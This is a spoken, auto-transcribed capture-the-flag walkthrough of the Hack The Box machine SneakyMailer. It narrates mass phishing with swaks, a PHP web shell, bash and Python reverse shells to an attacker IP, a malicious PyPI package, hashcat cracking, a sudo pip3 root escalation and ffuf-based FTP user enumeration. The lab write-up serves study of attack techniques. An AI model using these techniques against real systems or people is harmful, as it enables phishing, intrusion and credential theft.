 what's going on youtube this is ipsec i'm doing sneaky mailer from hack to box which was a really fun box that involves scraping a bunch of emails off a website and then sending phishing emails to all of them hoping that one clicks the link and sends some data uh the only thing i really didn't like about this box was you didn't have to create a good phishing page it looked like the box was intended for you to have to make a fake like registration page and then the user would only submit registration data to that page however um that's not needed you can just stand up netcat and they go right away to send you the post request it'll make much more sense once we get into the video and at the end of the video i'm going to do something a little bit extra and show you how i'd create a quick application to do a light fuzzing on a protocol you may not be familiar with so with that being said let's jump in as always i can begin with the nmap so dash sc for default scripts sv enumerate versions o a output all formats bring the directory and map and we'll call it sneaky mailer and then the ip address which is 10 10 10 197. i'm also going to run nmap with sudo because i'm not the root user and since this command does take some time to run i've already ran it so let's just take a look at the results and we have quite a few ports open first thing i notice is vsftpd is running on port 21 and because nmap doesn't tell us anonymous login is open chances are there is no anonymous login however it's one of those things i always just like to double check because it takes like five seconds so just log in with anonymous anonymous and we get uh oh right away we got login failed so nothing happens there so we'll just close that out and keep on going we do have ssh on port 22 and it's a debian box we have smtp on port 25 and that's running post fix and looking at these i don't see anything like a hostname uh we do get confirmation this is debian nginx running on port 80. so i'm going to guess this probably isn't php just because i generally don't see php on nginx doesn't mean it's not possible it just means it's not exactly common and we see it's giving us a redirect to sneakycorp.htb so i'm going to go ahead and make sure this is in my host file so let's copy this sudo vi etsy hosts and then we'll add a 10 10 10 197 to this box and all that's going to do is if i try to ping sneakycorp.hdb i can't do it and now i will be able to now there we go so since i rewrote the dns entry from my local box when this web server does point us to go to this directory or this domain uh our box will know where to go we also have imap on port 143 and common name is localhost and this ssl search so we're not really getting anything there uh this is imap over ssl and port 8080 is running engine x as well and this one is giving us the welcome to nginx banner so let's start off by just going over to the page so going to 10 10 10 197 and we'll get redirected to sneakycorp.htb and it looks like we have a webpage so i'm also going to go to 101010 197 and port 8080 and we get welcome to nginx so before we get too far in let's just start a go buster we should find out exactly um what language this page is if it's python php or whatever and it looks like we do have nginx running on php we can try like index.php here we don't have anything when i do gearbuster i'm not going to specify the index or extension sphp here because we just don't know what the extension is it'd be weird to have two different engine x things on one box both pointed php so that's why i'm not going to do that uh because chances are they would just use this nginx process and put it under a different virtual host so let's go and run a go busters so go buster dir mode dash u http 10 1010 197 port 8080 w for word list user share word list uh actually i'm using sequest now so op set list and then discovery web content and i think we do raft small words first that's generally one that's been my go-to lately and we can do the same exact thing except next time we are going to change it for sneakycorp.htb for this url okay so the dirt buster has been started let's just go poke at this so right away we have the notifications in this right it says welcome to sneaky corp and then we got some messages and i can't click on these messages but we have names so brady grier cara stevens and it's telling us talk with brady um let's see if we i don't know how to view the rest of this message it says hey my name is brady dot dot dot trying to get like the tool tip to show by leaving my mouse cursor over it's not working clicking on the profile picture we can only log out uh there is this project update thing the project teams has been formed and work allocated please check your email for further instructions and register account so chances are i'm thinking this is going to be phishing or something because this is one of the few boxes that have web servers stand it up or stirred up and then we have this pie pie it is now possible to install modules with pip on our server and looking at this there is a create an account page and it's called registration.png i don't see any type of register i'm going to log out and when we log out nothing happens so chances are this is i guess um just coded so we're always logged in there's no login function but i am going to try login.php and go back to my go buster because i forgot dash x php on this one to append.php to all the words it is finding so it would tell me if login or register something.php exist on the server i am going to click on this link the team and we get a list of emails it looks like so let's just go and change this to a hundred looks like we can grab everything on one copy so i'm just going to copy this entire thing and then we will go and create it that is team.php go buster just found and that is what we're on so nothing is there if you just looked here i was noticed that so let's create emails or let's do team.text and copy this paste uh ctrl shift insert there we go and it looks like this is tab delimited i think that's what this blue thing is all these blue um dollar signs or just saying end of line i think this is tab so i'm going to save this and we'll arc dash f for field separator backslash t for tab team.text and we'll print i think four i think it was like name position office email so if the delimiter is tab we'll only see emails here um that does not look like it like that i'm going to put team.text at the end of this there we go so that delimiter was tab and now we only have emails so i'm going to do this direct it to emails.txt if we cat emails.txt less it we have a list of emails so now let's try to send mail via smtp and i'm gonna use a tool called um swaps for this we could do like telnet but this is swiss army knife smtp which just is gonna make this so much easier we can see it has a bunch of arguments if it is authenticated there is a method for auth but we're going to try to do it on authenticated so i'm going to do v uh we'll call this fish dot sh we're just gonna do a bash script i'll do four i and cat emails dot text and then do and we'll say swaps and i think i can do multiple lines like that uh we could put all these arguments on one line but um it's probably going to be easier to read if i just do a different argument on each line so the from email i'm gonna do support at sneakymailer.hdb and the great thing is if the smtp server is just open which you'll generally find it is on internal networks um you can just say the from address as anything you want so two this is going to be i uh we could do email to make it a bit easier to read so for email and that and then we probably need to do that header this is going to be the subject we want so subject uh please register your account and i chose that because if we go to the dashboard we just have this project update of the website asking people to register so let's do another backslash body we're going to give them a link to register i'm going to give them http 1010142 slash register.php i don't that doesn't exist on the server but um it still looks legitimate and then the server is going to be 10 10 10 197 that is the server of sneaky mailer so i can do done and if i typed all that correctly it should work keyword being a major if i type that correctly so nclvmp i'm going to do the k and the k is going to keep it open after a connection i think um lv man nc keep dash k is keep open uh lvn kp there we go so what that did if i do nc localhost 80 test nc localhost test we can see netcat stays open if i get rid of this the k and we do this and close this it closes netcat afterwards and i don't know how many users i'm going to get to come to me so that's why i'm doing the k option so we're going to do fish.sh and see if they click this link um service or name not known dash dash server line eight uh let's try the hostname so sneakycorp.htb and this from can probably be sneakycorp.htb as well uh dash dash server command not found oh i don't have a backslash here there we go there we go it's connected and we'll see it starts sending a bunch of toenail i hope so let's give it some time and you can see all the um commands it typed so when it has this arrow away this is the command it ran so it ran a extended hello with my hostname and then the server responded with a bunch of information what the server is allowed to do and i said okay i want to send mail from this address server goes ok and then i want to say i want to go to this address the server says ok and then i begin the data stream and the servers tell me okay end with a carriage return and a line break i believe just two of them uh carriage return line break period carriage return line feed i think it's line break uh i don't know line feed is what that stands for but it wants it to end with a period and new line so we say okay here's the date the email should be here's the address in the header the from in the header the subject of this the message id uh the mail agent i'm using and then here's the content of the email i want to send and then we send the period which signifies this is going to be the end of the email and the service says okay we have queued the email and we're like okay uh closer connection i'm gonna do that for each of these accounts and it can take a little while so i'm just going to let this run as it sends a phishing email to every account to see if anyone clicks it and chances are we're just going to get like a user agent or something back here and from there we can try to figure out what we want to do um this is just making sure someone clicks because i don't want to go and create a whole fishing page if i don't see a user clicking to begin with because that would just be a lot of wasted time so let's check back at our go buster nothing there this one is still running and we don't have anything interesting here either so i'm just going to exit this and then we will just wait and eventually we actually gotta hit back and the user just sent a bunch of information so this was a probably slightly poorly coded um script in order to simulate a phishing attack uh to do it a bit better i probably recommend um like checking the page and then forcing a login form or something but we'll go over that at the end of the video most likely since generally you can't just stand up a net cat session and get a post request back um i'm starting up burp suite just so i can decode this request i forgot to do it before and i probably should update my burp suite but oh well we'll do that later so going over the decoder i'm just going to paste this and we can get everything so first name paul last name is bird his email his password and he confirmed his password so let's go and see what we can do there was a ftp site so let's try logging in with ftp so ftp 101010 197 put the username and we'll right away denied sweet so we have a way to enumerate um valid users i don't know of a tool to do it i'm sure there is um let's see ftp i bet metasploit has something so msf db run must be run as root okay so i'm just going to check the new scripts for metasploit because we may be able to enumerate potential usernames um let's do ftp 1010 10 197. root exist on the box i know and permission denied um another user that probably exists on the box has been permission denied if we try doesn't exist permission denied so there's going to be some hard-coded user that works i'm just going to run search ftp and let's go through auxiliary modules so i'm looking for like a new option so i'm just going to put my cursor to the top and then type slash a new to see if we have anything uh this is auxiliary scanner ssh so that's f sfdp i just want ftp and we don't have anything so maybe i can just google um enumerate valid ftp users to see if they have anything uh brute force ftp credentials ftp user unum so we got this nmap script and let's see oh this is an end map this is just pearl why do i think that was nmap let's just try this real quick wget v ft pearl i can't remember the last time i've run a pro command uh vim how do we use this uh what that's annoying uh we have to go and go raw and then we can download this w get that mv dot one and then perl this command there we go so check if a user exists dash u uh let's see dash t host ten 10 10 197 let's see file of host names um capital u is a file so opt let's do set list and then discovery where is users uh upset list usernames and we can try um top username shortlist so we're doing the scan while this goes we can try something else um let's see if i have any mail clients i don't so we're going to log in via email with this credential so sudo um we'll do apt install thunderbird yes and we have some valid users so admin root test guest info i don't know if this is accurate is it just saying every user let's see copy i literally think that's saying every user see is ansible here it is so maybe this is not a good script 17 results and this file is 17 names so yeah not a good thing to do um thunderbird is installed so we can run it and if you know in the comments leave a comment of a good ftp enumeration tool and we'll add in the next time we have to do something like this uh we can copy that password name i'm just gonna do paul we'll paste the password and we'll put his email here we go um sneakymailer.htb i'm going to make sure that host resolves in my host file so v etsy hosts sneaky corp sneaky mailer.htb continue and let's see if this is going to authenticate it's trying common server names and it looks like it found things we got imap and smtp uh username paul byrd and oh it failed to find settings um let's see retest server hostname i'm going to get rid of that beginning dot just try sneakymailer.htb retest and i'm going to make sure we didn't type by when we added this or maybe i didn't save we now resolve and it looks like it failed to find the settings i'm not sure exactly what is going on here um let's see i'm gonna start up wireshark and we're gonna see if it actually makes a connection so let's go to tun zero i don't have permission on that device sudo wireshark there we go let's do ton zero retest let's follow the stream see capability log out it's not sending any credentials two three let's do search imap um i wonder maybe it doesn't support logging in let's say ssl try this option we may want to do four four three fail to find settings for email account uh cancel see i'm going to try a different mail client i think so let's do sudo apt install evolution i'm not sure exactly what's going on with thunderbird um honestly i only use outlook for mail clients so i don't know all the configurations come on so evolution is installed let's try this now so launching evolution and i hit alt f2 to bring up that prompt if you're wondering so let's see identity paul byrd paul byod reply to maybe paul byod at sneaky mailer.htb sneaky mailer um add paul byrd uh oh it wants an email address here paste okay so for the server sneakymailer.htb username paul byrd click next sure sneaky mailer.htb click next paul byod at sneaky mailer okay um accept this certificate and let's get his password so paste this in uh once password for my keyring say paul byod paste this okay did we log in let's go to inbox no messages i should have checked that um no option and read that error message um let's restart evolution evolution see don't add to key ring paste uh file system initially the file system initialization error contact your mail administrator oh and the sent mail there are two things so i don't know exactly what that error is but we do have module testing and hello low your current task is to install test and erase every module you find in the pi pi service let me know if you have any inconvenience and then we also have password reset hello administrator i want to change this password for the developer account username developer and we have this long password so let's go and try the ssh ssh developer at 10 10 10 197 paste the password and nothing happens we can try ftp 10 10 10 197 developer and see now it's actually asking for the password that's the thing we could um use to enumerate users because if we try ftp 101010197 and we have a username that doesn't work it just says permission denied so we should be able to brute force valid users of this ftp just based upon it giving a password prompt we do a dir there is dev let's go into dev and we have a few files um team and index.php so i can download i think it's get on ftp um what i'm going to do make sure it's still in makeder ftp go into this directory and i probably could have run i think it's um like lcd for local cd to change the directory into ftp but i just always like exiting ftp and redoing it um so let's download this w get dash r um developer colon this i want to say it's like ftp colon slash that at 10 10 10 197 will this work um let's put this in single quotes uh stupid bad characters unable to resolve host name nah oh can we escape this i may just mainly download it um normally like user password is separated by an at sign but this password has an at in it so i'm having trouble figuring out the correct way to escape this see man wget user is there an option for user dash dash user dash dash password so we can try that so ftp dash dash user developer developer there we go password um try this put it in single quotes uh maybe dash dash user equals uh maybe get rid of the equals here um maybe don't make a typo when i type password there we go so now we're doing a recursive download of this ftp server to download all the things um that comes in super handy because now we can easily just go and look at the php source code so if we do team.php we can quickly look at it if i did vim we have it in syntax highlighting and we could search for like uh bracket that which would be the php tag there's no dynamic content on team.php i can do v on index and we can kind of do the same thing no dynamic content there what i'm going to do is i'm just going to put that in real quick to make sure it would actually find it because those are two special characters i want to make sure i wouldn't have to escape them or anything and i don't so whenever playing with things it's always best to um test it out to make sure you have like a control in something that you know what you're doing would work if it was correct there is this pi pi directory and there's a register.php but again there's no actual php so the server uses the php extension but it could just be html files because there's no dynamic content we can try 10 10 10 197 pi pi slash register.php and uh pie pie slash register dot php and we get this create account thing but again nothing happens when we do this um we could just download this page and then host it locally so in a phishing email it's a bit more believable that someone would type all this information but we didn't have to do that so let's see the next thing we should do is see if we can just upload files to this ftp directory so let's do ftp 101010 197 developer and we'll copy this password and do a dir go into dev um let's see cd ftp echo please subscribe to test and we'll try to put on test and we can actually upload that file so let's see if we can find it on the server so let's go to sneakycorp.htb slash test nothing there we could try port 8080 that was a different web server it's not there there is a slash dev is that a directory uh it does not look like it um we could guess that a lot of websites use subdomains so i can do sudo vi etsy hosts and we can put the subdomain of dev.sneakycorp.hdb see if that is set so let's try dev dot that slash and we get a page so let's try test and not found um let's see let's go back to ftp dir it's not there anymore let's put test slash test and it's asking us to download the file so it is there there's just a cron that is deleting files in this ftp server but we can put a php shell and just get code execution so let's um v shell.php and i'm gonna do php um system request please subscribe like that and we'll put shell.php if i do shell dot php here please subscribe equals id we can run commands so let's send this over to burp suite and do a reverse shell uh the reason why i like sending this to burp suite now is because we want to make this a post request because there's less bad characters in a post request so it's just easier to write so bash c dash dash i um like that dev tcp 10 10 14 2 0. 9001 uh zero at and one this is just a reverse shell one liner when you type it off you memorize it pretty quickly so let's go over to a new thing i'm going to just go back to the pane and i'm going to make the log script shell.log and that's just there so um it's automatically logging everything i do in this terminal pane so let's go back to burp suite send this to repeater run it we get 404 so let's upload this file again put shell.php run it go back to this and we have a low priv shell on this box so i'm going to do python dash c input pty pty dot spawn then dash ctrl z stty raw minus echo fg enter twice hit enter and now you'll have tab autocomplete and everything which is nice and i'm going to control l to clear the screen i can't so export term is equal to x term and now i can clear the screen so the first thing we should do is look at the home directory is there like flag.text there isn't if i do ls slash home there is a user called low so if i do ls slash home low there is user.txt and can we get to it uh we can't so we have to escalate to this low user the first thing i'm going to do is a ps ef grip for low to see what low is doing and we can see the user low is running slash home low virtual and bin python our app scripts low install modules dot pi so let's see if we can go into this directory up scripts uh low and we can't i'm going to try cat low install modules dot pi and we still can't do it um there is a developer uh cd developer permission denied vmail this is probably the smtp stuff so we can't really get anything i'm gonna go to my home directory and we have a dev.sneaky a html a pie pie and a sneaky corp so i'm going to do cd html and that's just the default thing so this looks like what um port 8080 was at i don't know exactly what port 8080 is for there is the pi pi so let's go into pi pi there's packages in virtual environment i'm going to define dash type f to list all the files we have a ht pass wd file um i guess we can grab this and then we'll try cracking it so let's copy this and then ssh to the kraken this is just a box i have in my house because you should never crack things in a vm and additionally i don't want to crack things on my host computer because that's where i record from so i always like going to a different box to crack so i'm gonna go cd hashes i'm gonna vi pi pi it's so hard not to say pi piper when i keep saying this name but um let's do hash cat dash dash example hashes i'm gonna do less dot slash and do ht passwd um let's see apr one i'm gonna search for next and we have the hash format hit up a few times mode 1600. so i can do dot slash cat dash m 1600 hashes pi pi and then the word list which is up word list rock you while that runs we can add pi pi to our host and token length exception so we have the username inside of the file it was user colon um hash i'm gonna add the dash dash user flag so hashcat will just ignore the username and now it is cracking looks like it's already done we can look at this i'm just going to do get rid of the word list shell and we get this password i have no clue what that word is but we got a password so let's take a look at this um pi pi domain so sudo v i etsy cron i don't know why the crown tab etsy hosts uh and we want to do pypi.sneakycorp.htb and let's see just going to copy this echo that to cred just in case we need it and we can go over to our browser pi pi.sneakycorp.htb i'm going to take burp suite off and we don't get anything pie pie dot sneaky corp dot htv port 8080 and here we go so this is what port 8080 is it's a nginx server and this is pi pi i'm going to go and see cd etsy engine x sites available and we could pull it this way by looking at the nginx config we see the server listens on port 8080 the server name is pipe.sneakycorp.htb and it's piping it to localhost port 5000 so that's another way we could have done that so let's go and create a malicious pie pie package and see if we can upload it here the first step with that is figuring out how to create a pie pie package so i'm going to google malicious pie pie and it looks like we're going to get to a bunch of news articles where this has actually happened so i'm guessing we're redoing what these attackers did um let's just instead of googling malicious pi pi package let's just create uh google how to create pi pi package and let's see packaging python projects so it looks like we need a directory a name and a so let's go here and i'm going to makeder pie pie and we're going to make the direct the package name i'm going to call it please subscribe and this is going to be uh v init.pi and that's just a blank file and all that does is if we do python 3 now and we say import please subscribe we can import that module if the whoops cd please subscribe if this init.pi wasn't there so let's just do sure that so there's no init.pi here i'm just going to clear this cache as well and we do the same thing so let's go python3 import please subscribe oh it still works um when you import the directory name the init.pi would get executed so that's what that's doing um so let's emit pi print hello world so we can do that this should work python3 import please subscribe and we can see it executes that edit.pi so that's what that is exactly for um i'm going to clear that so it's not doing anything we just i think need that file to be created and then we got a set of dot pi instead of pi looks like this so let's do this vi setup.pi paste and we're going to do a malicious thing here so we could potentially drop an ssh key or something but i'm just going to do a reverse shell so python reverse shell and we can go to pen test monkey and copy this paste and let's just make this a shell so whoops import socket subprocess os s is equal to socket yep let's do 10 10 14 2 port 9001 and then we can get rid of all these put them on lines like that and i'm guessing we're missing oh there we go um since everything was purple here i knew there was a quote that wasn't closed and it was right there so we can delete that and now when this module is loaded it should run this command so we can test this reverse shell nclvnp 9001 python3 setup.pi we get a connection from a box so we know that works so the next step is to um have our python point to the server so to do that we have to create a pi pi rc file which will be in our home directory so dot pi pi am i spelling that correct i think it's p y p i um let's go this what is it p y p i yup pi pi r c and then we have to say dist utils the index server is equal to remote and then configure remote so repository http pi pi dot sneaky corp dot hdb port 8080 uh username is going to be pi pi and we do a colon and password is equal to let's cap the cred and grab this paste and i think that is it if not we'll have to google exactly pie pie and figure it out so we can do python 3 the name sdist is going to tell it we want to make it a like egg file which is like a python plugin then we want to upload it to the remote site very first show we get back is rip address 10 10 14 2 so i'm going to start another netcat session and close it because it actually executes this python script and then it should have uploaded it long description not defined let's see long description oh this doesn't have quotes i'm just going to delete that line sure what if i need to get rid of that python 3 thing it was python36 that was required uh index servers no option index servers in section v pipe.rrc uh maybe it's index servers let's try this again submitting and we get a shell back from 10 10 10 197 if we do id it is going to be the user low and again the reason why we thought that is if we do ps ef grep on low [Music] the user was running a python script called install modules so here i'm going to do lsla uh we can go in home low and we can i guess drop an ssh key to get a more stable shell uh python we could do python tty trick as well but i'm just going to drop an ssh key here so ssh let's do ssh dash keygen dash f for file and i'm going to call this low cat load.pub and we're going to grab this and echo with two carat so we append it to the authorized key file and if we cat authorize key we can see our key it begins with a bunch of a's ends with goo bunch of a's and ends with goo so now we can do chmod 600 on low sh-i low low at 10 10 10 197 and it did not work why did that not work lsla authorize oh um move authorize key to authorized keys typos get you every time there we go so now we have an actual ssh connection which i think is just a bit more stable and also a lot easier to get into if we ever screw things up so let's just close that and we can also see if we go to log [Music] we have shell.log and this is the contents of everything we did in that reverse shell for your notes so let's see we can do sudo l and it's taking a while once we run this command and that tells me that the etsy host file um has the wrong name here sudo is going to do a dns reverse lookup every time you run it and when it can't find the hostname as 127.001 uh it's going to take a while so i'm going to cat etsy host and we can see the box's name is sneaky corp but we have sneaky mailer here so every time we run sudo it's trying to figure out who sneaky mailer is never gets a response and then once it times out it runs this but we have low is able to run pip 3 as a root so let's do gtfo bins to see if there's anything bad we can do with pip 3. so i'm going to type pip so pip 3 came with nothing but pip did and there is a pseudo so i'm going to click sudo and it looks like i'm going to probably copy these first two lines i'm not copying the last one because this is just pip i'm going to specify pip 3 manually um let's go to cd slash temp to run this and then i'm going to copy this line but go back and type pip3 and it's going to take again probably 30 seconds for that dns request to time out and once it does uh we'll have hopefully a root shell there we go it looks like we have a shell if we do id we are root so we can grab root text if we wanted to um let's do python if i do sudo l here is it still going to take time it is i should have done something to fix that um i guess we'll just wait wait this one out and then i will upgrade my shell probably just dropping the ssh key again and we will edit that host file so you can see pseudo indeed is much quicker when the correct host name is in the file so let's do python 3 c import pty pty spawn then bash uh control z oh control z isn't working um i wonder if i just can't control z because i'm in ssh connection looks like it's working so let's do vi etsy host see how this works looks like it's doing fine i'm going to add sneaky corp dot htb pseudo dash l and it's still not instant i wanted this because there was multiple entries and that is like hung now sh-i that was not it let's see sneaky mailer failure to return dns first name oh the etsy host it's probably just sneaky mailer sneakymailer.htb ping sneaky mailer getting a response pseudo dash l and instantly returns so as soon as we have the host name correct it works perfectly so apologies for the sloppy cut when i was re-watching the video i decided i wanted to just expand upon that ftp enumeration piece at the beginning i'm not going to hunt for a tool and find the tool to do it for us because honestly where's the learning in that instead i'm going to show how i'd approach this problem if i was confident there wasn't a tool out there to do it and the very first step is to make the problem more familiar to me so i don't know the ftp protocol all that well so i'm just going to convert it into http and you can see plenty of other people do things like this like i remember um tavis ormandy from google project zero when he was fuzzing defender he actually created a program to port defender to linux so he could use his linux tools and buzz it so this is kind of what we're going to be doing with the ftp we're going to move ftp to http and then use fluff against it so in order to do that i just need to create a php script and what we're going to do is probably echo something into tonet so let's try echo ipsec and then ftp 101010 197 and see what happens hopefully it just goes to log and failed now since we're nostradamus if we know that we can just go like developer and this output is different so because this is different output we can um identify quickly when this happens at least over http so that's what the theory behind this is going to be so let's put php here and then we're just going to use the trusty system command and say echo um then we'll do request name and then actually we have to concatenate these two strings with the period and we can pipe this over to ftp 10 10 10 197 and close the system and that's probably going to be all she wrote so let's do php dash s1270180 uh we have to run that with sudo and now if i curl localhost slash name equals ipsec let's see what we get uh login failed we can see the permission denied method right here if we do developer let's see um doesn't look like we're getting anything back it's probably hung up on this because the socket didn't close so if we hit enter there will we get something back we do uh we got nothing so we can go back into a script and put a timeout in here um let's see let's go over to google php set timeout uh set time limit so set time limit sweet it went green uh let's just go for two seconds so now our script should fail after two seconds if we're lucky okay one mississippi two mississippi three um the script is still running and i think it's blocking since this php app is not multi-threaded we can't run multiple at the same time so that's not working so it looks like the timeout does not work with the system command or we're using it wrong so let's go back here and let's see in bash there is a timeout command so we can probably just do timeout to there so if we do like sleep five one two three four five it should come back now uh if we did timeout two we can actually kill this command after two seconds so one two and we get it back so we can do that same thing with that php so now when i curl developer one two and it comes back so what this allows us to do now is we can use fluff so we can do f dash w for word list opt set list user names uh we can test with let's just do top 10 and then dash u for url http localhost and then name is equal to fuzz and it should go through each one and output the size um developer is not on this list so it's not going to do anything we could cheat if i can close off or let's see one of these should die there we go so let's just um cheat real quick so vi and go to where's the sec list sudo vi opt set list discovery actually instead of doing that let's just do please subscribe and we'll say this user does exist and the user was developer we can do some after it as well thanks for the sub so now when we run this with this word list we should be very obvious um [Music] to get the file name wrong it should be very obvious which is the valid username so maybe i should do the full path pwd slash what is going on there echo this cat oh i stopped the web server there we go so we can see each request and the size is 48 and once we get to developer the size becomes one so uh yeah i was wondering why it stopped outputting but it was just a bug there so showed everything uh we can do 5 h and i think this is match it says let's see filter match so if we want to match the or filter out the size so we can say fs to filter size and say we don't want anything with a size of 48 so let's do dash fs48 and hopefully it hides everything so while that goes um we can try to make this threaded and by making it threaded all we have to do is move it over to like apache because that's what the web server does so that's one of the reasons why whenever you do like python simple http server or something you should put a wsgi in front of it i think that's web server gateway interface or something because that's going to handle executing the script and making it threaded but in php we can just draw an apache and it's super simple at least i really hope it's going to be or this is going to be an awkward segment of the video but ver www.html and i already have some stuff in there um we can do sudo move and then if we go to cd etsy apache 2 we can look at mods available ls grep i php php 73 is available so we can do mods enabled lsla grep php and i see php is enabled um if it wasn't enabled i think it's just a2 en and whatever mod so we can do sudo a2 dismod php 73 what is it lsla grep no dash so if we do sudo restart apache 2 uh service let's just do system ctl system ctl uh failed probably because are we listing on port 80 nope pseudo journal ctl-xe let's see apache 2 exit cd var log apache 2 let's just go sudo su ver log apache 2 tail error.log nothing there ss lntp grep 80 8080 is listening 443 system ctl stop apache 2. and we'll start it what is going on apache um that's not supposed to happen switch engine x status that's not loaded etsy apache 2 conf dash enabled site stash enabled is that i'm not sure what i did to do that is that default and parent ls opt x plico probably installed some package that did that um rm098 and now it starts okay i'm not sure where that package came from um i wonder if i can just google this package name and see guessing it's something i installed um yeah not sure but apache is running now so we do local host we get that if i go to index.php it's going to print out the script it didn't show it in this because it's inside of brackets but it's not executing because we don't have the apache 2 module loaded so if i go back to the a2 en mod to enable the mod php 73 and then we restart apache again when i refresh the script it's going to error out because it's going to say like request name is used but not given um it's thinking permission denied so it looks like it d the name i don't know um i thought it would air but name equals test and we get the error message sweet so if we go to developer it's probably going to time out and give us nothing there we go so now let's run faff and see if it goes any faster because now we're going to apache and not our php so apache should be yup uh threat what what is that size um cat please subscribe yep oh index.php because this is going to index.html uh because that file exists in apache yup much faster uh oddly enough the size is 50 now not 48 so let's filter size for 50 and you can see how much quicker that is if we don't it comes back nearly instantly um again let's stop apache and then we'll run it again so you can see the difference between it being threaded or not and then that will be the video so let's just go here sudo php dash s see that run it and i guess i gotta copy the file back sudo cp ver www.ht index.php and again if i run the php web server you can see it's definitely one at a time this way so a little bit of things i would do if i was approaching this challenge with no knowledge of the protocol always convert to something you know and then use the tools you know against it so hope you guys enjoyed the video and this little extra segment take care and i'll see you all next week